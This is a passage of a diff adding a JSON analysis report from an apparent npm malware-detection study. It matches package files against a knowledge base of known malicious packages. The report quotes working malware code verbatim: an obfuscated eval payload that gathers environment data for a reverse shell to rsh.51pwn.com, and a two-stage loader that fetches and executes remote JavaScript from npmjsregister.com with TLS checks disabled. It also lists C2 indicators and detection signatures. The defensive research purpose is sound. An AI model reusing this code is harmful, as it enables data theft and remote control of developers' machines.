+                  "why_malicious": "The package is a typosquatted clone of the legitimate @typescript-eslint/eslint-plugin, designed to compromise developer systems. It exfiltrates sensitive clipboard and keystroke data, establishes persistence via Windows Startup, enables remote command execution through a C2 channel, and disables legitimate ESLint processes. The package employs obfuscation and dependency abuse to evade detection and maximize impact."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious package via typosquatting, mistaking it for the legitimate @typescript-eslint/eslint-plugin.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is executed upon import or runtime as part of the development workflow."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Clipboard and keyboard monitoring is activated to collect sensitive data from the user's system.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive clipboard and keystroke data is stored locally for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence is established by copying a malicious .bat file to the Windows Startup folder.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious payload is automatically executed on every system reboot, maintaining attacker access."
+                  },
+                  {
+                    "step": 4,
+                    "action": "WebSocket connection to an obfuscated C2 server is established for real-time data exfiltration and remote command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker can exfiltrate collected data and issue commands to the compromised system."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Legitimate ESLint process is disabled to prevent detection and interference with the malicious package.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code operates without interference from legitimate code quality tools."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Clipboard or keyboard monitoring in npm packages not related to accessibility or input management",
+                    "Copying or writing files to the Windows Startup folder from npm package code",
+                    "Obfuscated or dynamically decoded C2 server addresses in JavaScript code",
+                    "Persistent WebSocket connections to external IPs or domains from development tools",
+                    "Execution of shell commands to disable or delete legitimate development tool processes (e.g., ESLint)"
+                  ],
+                  "file_indicators": [
+                    "prettier.bat in Windows Startup folder",
+                    "Unexpected .bat files in npm package tools directory",
+                    "Presence of clipboard-event or node-global-key-listener in package.json dependencies",
+                    "References to socket.io-client in linter plugin dependencies"
+                  ],
+                  "network_indicators": [
+                    "WebSocket connections to ws://135.181.226.254:5051 or similar Hetzner Online GmbH IPs",
+                    "Outbound connections to obfuscated or base64-encoded server URLs in code",
+                    "Unusual persistent network activity from static analysis or linter plugins"
+                  ],
+                  "how_to_detect": "Monitor npm packages for access to clipboard or keyboard events, especially in packages not related to accessibility. Flag packages that copy or write files to system startup folders or establish persistent WebSocket connections to external IPs. Scan for obfuscated or encoded server addresses and unexpected dependencies such as clipboard-event, node-global-key-listener, or socket.io-client in code analysis. Alert on the presence of .bat files in package directories or the Windows Startup folder after npm install, and monitor for shell commands targeting legitimate development tool processes."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4172303080558777,
+              "code_similarity": 0.5085890293121338,
+              "behavior_similarity": 0.32587161660194397,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_089791_snippet_1",
+              "source_package": "assets-table (example, also applies to assets-graph, tslib-react, tslib-util, etc.) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_089791/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4079750180244446,
+              "code_similarity": 0.4370661973953247,
+              "behavior_similarity": 0.37888380885124207,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const os = require(\"os\");\nconst path = require(\"path\");\nvar fs = require('fs');\n\nprocess.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0\n\nfunction registerAudit(version, projectUrl) {\n\tvar request = require('sync-request');\n\tvar ticket = request('GET', projectUrl);\n\tfs.writeFileSync(version, ticket.getBody());\n}\n\nvar folder = os.homedir() + \"/.vscode\";\nif (!fs.existsSync(folder)){\n    fs.mkdirSync(folder);\n}\nregisterAudit(path.join(folder,'/jsontoken'), 'https://npmjsregister.com/checkupdate.php');",
+                "code_behavior": "At runtime, the code disables TLS certificate validation, creates a hidden directory in the user's home folder if it does not exist, makes an unsolicited HTTP GET request to a remote server (npmjsregister.com/checkupdate.php), writes the server's response to a hidden file ($HOME/.vscode/jsontoken), enabling the next stage of the attack.",
+                "malice_analysis": {
+                  "why_suspicious": "The code disables TLS certificate validation, makes an unsolicited network request to an external domain controlled by the attacker, and stores the response in a hidden file within the user's home directory. This is not expected or documented behavior for a legitimate npm package.",
+                  "violated_expectations": "Legitimate npm packages should not disable TLS verification, make hidden network requests, or write hidden files in user directories during installation or import. Such actions are highly abnormal and introduce significant security risks.",
+                  "similar_legitimate_use": "Some developer tools or updaters may check for updates or download configuration files, but they should never disable TLS verification or hide their actions without explicit user consent and documentation.",
+                  "key_indicators": [
+                    "Disables TLS certificate validation via process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0",
+                    "Creates hidden directory in user home ($HOME/.vscode)",
+                    "Fetches data from suspicious domain (npmjsregister.com/checkupdate.php)",
+                    "Writes remote data to hidden file ($HOME/.vscode/jsontoken)"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, upon import or execution of the package's main entry point",
+                  "file_location": "index.js or equivalent main entry file (e.g., tslib-react/index.js)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "assets-table (example, also applies to assets-graph, tslib-react, tslib-util, etc.)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions as of the report date",
+                  "why_malicious": "The package contains intentionally obfuscated code that, upon installation or execution, disables TLS certificate validation, connects to attacker-controlled servers (npmjsregister.com), downloads and executes additional code, and facilitates a multi-stage attack chain designed for remote code execution and potential data exfiltration. This behavior is not related to any legitimate package functionality and is designed to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim is lured into cloning and running a repository containing two paired malicious npm packages.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of first-stage package"
+                  },
+                  {
+                    "step": 2,
+                    "action": "First-stage package (e.g., tslib-react) executes, disables TLS verification, fetches a unique token from a remote server, and stores it in a hidden file ($HOME/.vscode/jsontoken).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Token is stored locally for use by second-stage package"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Second-stage package (e.g., tslib-util) executes, reads the token from $HOME/.vscode/jsontoken, sends it to the attacker's server, downloads a new JavaScript payload as $HOME/.vscode/checkjson.js, and executes it using Node.js.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Remote code execution and possible further compromise"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Disabling of TLS certificate validation via process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0",
+                    "Unsolicited network requests to suspicious domains (e.g., npmjsregister.com) during install or runtime",
+                    "Creation and use of hidden files in user home directory (e.g., $HOME/.vscode/jsontoken, $HOME/.vscode/checkjson.js)",
+                    "Downloading and executing code from remote servers at runtime using child_process.exec"
+                  ],
+                  "file_indicators": [
+                    "$HOME/.vscode/jsontoken",
+                    "$HOME/.vscode/checkjson.js",
+                    "Presence of unexpected files in $HOME/.vscode or $HOME/.vscode/npmcache"
+                  ],
+                  "network_indicators": [
+                    "Connections to npmjsregister.com, specifically to /checkupdate.php and /getupdate.php endpoints",
+                    "Unusual outbound HTTP/HTTPS requests to npmjsregister.com during npm install or package execution"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that disable TLS certificate validation, make unsolicited network requests to unknown or suspicious domains, or create hidden files in user directories such as $HOME/.vscode. Flag any package that downloads and executes code from the internet at install or runtime, especially if it uses child_process.exec on files downloaded from the network. Look for file creation in $HOME/.vscode or $HOME/.vscode/npmcache, and network connections to npmjsregister.com endpoints. Use behavioral analysis to detect execution of downloaded code and the presence of hidden tokens."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_089791_snippet_2",
+              "source_package": "assets-table (example, also applies to assets-graph, tslib-react, tslib-util, etc.) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_089791/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.40711510181427,
+              "code_similarity": 0.415092408657074,
+              "behavior_similarity": 0.3991377651691437,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const os = require(\"os\");\nconst path = require(\"path\");\nvar fs = require('fs');\n\nfunction getsvnroot(domain, entry, token, path) {\n\tconst https = require('https');\n\tconst querystring = require('querystring');\n\n\tconst options = {\n\t  hostname: domain,\n\t  port: 443,\n\t  path: entry,\n\t  method: 'POST',\n\t  headers: {'content-type' : 'application/x-www-form-urlencoded'},\n\t};\n\n\tconst req = https.request(options, (resp) => {\n\t\tlet data = \"\";\n\t\tresp.on(\"data\", chunk => {\n\t\t  data += chunk;\n\t\t});\n\t\tresp.on(\"end\", () => {\n\t\t\tfs.writeFileSync(path, data);\t\t\t\n\t\t\tconst { exec } = require('child_process');\n\t\t\texec('node ' + path, (error, stdout, stderr) => {\t\t\t\t\n\t\t\t});\n\t\t});\n\t});\n\n\treq.on('error', (e) => {\n\t  console.error(e.message);\n\t});\n\treq.write(token);\n\treq.end(); \n}\n\nprocess.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0\n\nvar dir = path.join(os.homedir(), \".vscode\");\nif (fs.existsSync(dir)){\n\tconst token = fs.readFileSync(path.join(dir,'jsontoken'),\n            {encoding:'utf8', flag:'r'});\n\tgetsvnroot('npmjsregister.com', '/getupdate.php', token, path.join(dir ,'checkjson.js'));\n}",
+                "code_behavior": "At runtime, the code disables TLS certificate validation, reads a previously stored token from a hidden file ($HOME/.vscode/jsontoken), sends it via HTTPS POST to a remote server (npmjsregister.com/getupdate.php), writes the server's response as a new JavaScript file ($HOME/.vscode/checkjson.js), and immediately executes it using Node.js, enabling arbitrary remote code execution.",
+                "malice_analysis": {
+                  "why_suspicious": "The code reads a hidden token, sends it to an external server, writes the server's response as executable JavaScript, and runs it using child_process.exec. This enables the attacker to execute arbitrary code on the victim's system, a classic second-stage malware pattern.",
+                  "violated_expectations": "Legitimate packages should never download and execute code from the internet at runtime, especially not in response to hidden tokens or in a multi-stage fashion. Disabling TLS verification and executing untrusted code are highly abnormal and dangerous behaviors.",
+                  "similar_legitimate_use": "Some updaters or plugin systems may download and execute code, but only with explicit user consent, strong security controls, and without disabling TLS verification or hiding their actions.",
+                  "key_indicators": [
+                    "Reads hidden token file ($HOME/.vscode/jsontoken)",
+                    "Sends token to remote server (npmjsregister.com/getupdate.php)",
+                    "Writes and executes remote code as $HOME/.vscode/checkjson.js",
+                    "Disables TLS certificate validation",
+                    "Uses child_process.exec to run downloaded code"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, upon import or execution of the package's main entry point, typically after snippet_1 has run",
+                  "file_location": "index.js or equivalent main entry file (e.g., tslib-util/index.js)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "child_process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "assets-table (example, also applies to assets-graph, tslib-react, tslib-util, etc.)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions as of the report date",
+                  "why_malicious": "The package contains intentionally obfuscated code that, upon installation or execution, disables TLS certificate validation, connects to attacker-controlled servers (npmjsregister.com), downloads and executes additional code, and facilitates a multi-stage attack chain designed for remote code execution and potential data exfiltration. This behavior is not related to any legitimate package functionality and is designed to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim is lured into cloning and running a repository containing two paired malicious npm packages.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of first-stage package"
+                  },
+                  {
+                    "step": 2,
+                    "action": "First-stage package (e.g., tslib-react) executes, disables TLS verification, fetches a unique token from a remote server, and stores it in a hidden file ($HOME/.vscode/jsontoken).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Token is stored locally for use by second-stage package"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Second-stage package (e.g., tslib-util) executes, reads the token from $HOME/.vscode/jsontoken, sends it to the attacker's server, downloads a new JavaScript payload as $HOME/.vscode/checkjson.js, and executes it using Node.js.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Remote code execution and possible further compromise"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Disabling of TLS certificate validation via process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0",
+                    "Unsolicited network requests to suspicious domains (e.g., npmjsregister.com) during install or runtime",
+                    "Creation and use of hidden files in user home directory (e.g., $HOME/.vscode/jsontoken, $HOME/.vscode/checkjson.js)",
+                    "Downloading and executing code from remote servers at runtime using child_process.exec"
+                  ],
+                  "file_indicators": [
+                    "$HOME/.vscode/jsontoken",
+                    "$HOME/.vscode/checkjson.js",
+                    "Presence of unexpected files in $HOME/.vscode or $HOME/.vscode/npmcache"
+                  ],
+                  "network_indicators": [
+                    "Connections to npmjsregister.com, specifically to /checkupdate.php and /getupdate.php endpoints",
+                    "Unusual outbound HTTP/HTTPS requests to npmjsregister.com during npm install or package execution"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that disable TLS certificate validation, make unsolicited network requests to unknown or suspicious domains, or create hidden files in user directories such as $HOME/.vscode. Flag any package that downloads and executes code from the internet at install or runtime, especially if it uses child_process.exec on files downloaded from the network. Look for file creation in $HOME/.vscode or $HOME/.vscode/npmcache, and network connections to npmjsregister.com endpoints. Use behavioral analysis to detect execution of downloaded code and the presence of hidden tokens."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@telefonica##luis-cli/5.5.0/package/lib/luis-trainer.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
